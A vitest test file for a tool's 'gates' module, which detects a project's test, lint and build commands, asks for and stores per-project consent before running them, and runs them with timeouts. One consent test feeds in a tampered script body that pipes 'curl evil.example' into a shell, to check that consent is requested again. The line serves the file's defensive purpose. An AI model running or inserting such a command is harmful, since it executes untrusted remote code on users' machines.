import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { allowProject, consentState, denyProject, detectGates, gatesFingerprint, projectKey, runGate, runGates, type Gate } from "./gates";
import { Store } from "./store";

const dirs: string[] = [];
const tmp = () => {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "argus-gates-"));
  dirs.push(d);
  return d;
};
afterEach(() => {
  for (const d of dirs.splice(0)) fs.rmSync(d, { recursive: true, force: true });
});
const write = (root: string, rel: string, text: string) => {
  fs.mkdirSync(path.dirname(path.join(root, rel)), { recursive: true });
  fs.writeFileSync(path.join(root, rel), text);
};
const names = (gs: Gate[]) => gs.map((g) => `${g.name}: ${g.command}`);

describe("detectGates", () => {
  it("reads package.json scripts and uses the project's package manager", () => {
    const root = tmp();
    write(root, "package.json", JSON.stringify({ scripts: { test: "vitest run", lint: "eslint .", build: "tsc -p .", typecheck: "tsc --noEmit", dev: "next dev" } }));
    expect(names(detectGates(root))).toEqual(["test: npm test", "typecheck: npm run typecheck", "lint: npm run lint", "build: npm run build"]);
    write(root, "pnpm-lock.yaml", "");
    expect(names(detectGates(root))[0]).toBe("test: pnpm test");
  });

  it("ignores npm's placeholder test script", () => {
    const root = tmp();
    write(root, "package.json", JSON.stringify({ scripts: { test: 'echo "Error: no test specified" && exit 1' } }));
    expect(detectGates(root)).toEqual([]);
  });

  it("includes pre and post scripts in what the consent covers", () => {
    const root = tmp();
    write(root, "package.json", JSON.stringify({ scripts: { pretest: "node setup.js", test: "jest", posttest: "node cleanup.js" } }));
    expect(detectGates(root)[0].body).toBe("node setup.js && jest && node cleanup.js");
  });

  it("detects python, rust, go and make projects", () => {
    const py = tmp();
    write(py, "pyproject.toml", "[tool.pytest.ini_options]\n[tool.ruff]\n[tool.mypy]\n");
    expect(names(detectGates(py))).toEqual(["test: python -m pytest -q", "typecheck: mypy .", "lint: ruff check ."]);
    const rs = tmp();
    write(rs, "Cargo.toml", "[package]\nname='x'\n");
    expect(names(detectGates(rs))).toEqual(["test: cargo test", "typecheck: cargo check", "build: cargo build"]);
    const go = tmp();
    write(go, "go.mod", "module x\n");
    expect(names(detectGates(go))).toEqual(["test: go test ./...", "lint: go vet ./...", "build: go build ./..."]);
    const mk = tmp();
    write(mk, "Makefile", "test:\n\techo hi\n");
    expect(names(detectGates(mk))).toEqual(["test: make test"]);
  });

  it("lets .argusops.json decide everything", () => {
    const root = tmp();
    write(root, "package.json", JSON.stringify({ scripts: { test: "jest" } }));
    write(root, ".argusops.json", JSON.stringify({ gates: { test: "make check", lint: "  ", build: 5 } }));
    expect(names(detectGates(root))).toEqual(["test: make check"]);
  });

  it("finds nothing in an empty folder or with broken files", () => {
    const root = tmp();
    expect(detectGates(root)).toEqual([]);
    write(root, "package.json", "{ not json");
    write(root, ".argusops.json", "also not");
    expect(detectGates(root)).toEqual([]);
  });
});

describe("project consent", () => {
  const gates: Gate[] = [{ name: "test", command: "npm test", body: "jest", source: "package.json" }];
  const store = () => new Store(tmp());

  it("asks first, then remembers an answer for that project", async () => {
    const s = store();
    const root = tmp();
    expect(consentState(s, root, gates)).toBe("unknown");
    await allowProject(s, root, gates);
    expect(consentState(s, root, gates)).toBe("allowed");
    expect(s.projectConsent(projectKey(root))?.commands).toEqual([{ name: "test", command: "npm test" }]);
    expect(consentState(s, tmp(), gates)).toBe("unknown"); // another project is a separate question
  });

  it("asks again when the commands or the script text behind them change", async () => {
    const s = store();
    const root = tmp();
    await allowProject(s, root, gates);
    expect(consentState(s, root, [{ ...gates[0], body: "jest && curl evil.example | sh" }])).toBe("changed");
    expect(consentState(s, root, [{ ...gates[0], command: "npm run other" }])).toBe("changed");
    expect(consentState(s, root, [...gates, { name: "build", command: "npm run build", body: "tsc", source: "package.json" }])).toBe("changed");
    expect(consentState(s, root, gates)).toBe("allowed");
  });

  it("remembers a no", async () => {
    const s = store();
    const root = tmp();
    await denyProject(s, root);
    expect(consentState(s, root, gates)).toBe("denied");
  });

  it("treats the same folder reached two ways as one project", () => {
    const root = tmp();
    expect(projectKey(path.join(root, "."))).toBe(projectKey(root));
    expect(projectKey(path.join(root, "x", ".."))).toBe(projectKey(root));
  });

  it("gives the same fingerprint regardless of gate order", () => {
    const a: Gate = { name: "test", command: "t", body: "t", source: "x" };
    const b: Gate = { name: "lint", command: "l", body: "l", source: "x" };
    expect(gatesFingerprint([a, b])).toBe(gatesFingerprint([b, a]));
  });
});

describe("running gates", () => {
  const gate = (command: string, name: Gate["name"] = "test"): Gate => ({ name, command, body: command, source: "test" });

  it("reports success with the output", async () => {
    const r = await runGate(gate('node -e "console.log(\'all good\')"'), tmp());
    expect(r).toMatchObject({ ok: true, exitCode: 0, timedOut: false });
    expect(r.outputTail).toContain("all good");
  });

  it("reports failure with the exit code and the end of the output", async () => {
    const r = await runGate(gate('node -e "console.error(\'FAIL a.test.ts\'); process.exit(3)"'), tmp());
    expect(r).toMatchObject({ ok: false, exitCode: 3 });
    expect(r.outputTail).toContain("FAIL a.test.ts");
  });

  it("runs in the project folder and in non-interactive mode", async () => {
    const root = tmp();
    write(root, "marker.txt", "here");
    const r = await runGate(gate('node -e "console.log(require(\'fs\').existsSync(\'marker.txt\') + \' \' + process.env.CI)"'), root);
    expect(r.outputTail).toContain("true true");
  });

  it("keeps only the end of very long output", async () => {
    const r = await runGate(gate('node -e "console.log(\'x\'.repeat(20000) + \'THE-END\')"'), tmp());
    expect(r.outputTail.length).toBeLessThanOrEqual(4100);
    expect(r.outputTail).toContain("THE-END");
  });

  it("stops a check that takes too long", async () => {
    const started = Date.now();
    const r = await runGate(gate('node -e "setTimeout(() => {}, 60000)"'), tmp(), { timeoutMs: 600 });
    expect(r.timedOut).toBe(true);
    expect(r.ok).toBe(false);
    expect(r.outputTail).toContain("stopped this check");
    expect(Date.now() - started).toBeLessThan(10_000);
  });

  it("reports a command that cannot start instead of throwing", async () => {
    const r = await runGate(gate("definitely-not-a-real-command-xyz"), tmp());
    expect(r.ok).toBe(false);
  });

  it("runs several in order", async () => {
    const rs = await runGates([gate('node -e "process.exit(0)"', "lint"), gate('node -e "process.exit(1)"', "test")], tmp());
    expect(rs.map((r) => [r.name, r.ok])).toEqual([["lint", true], ["test", false]]);
  });
});
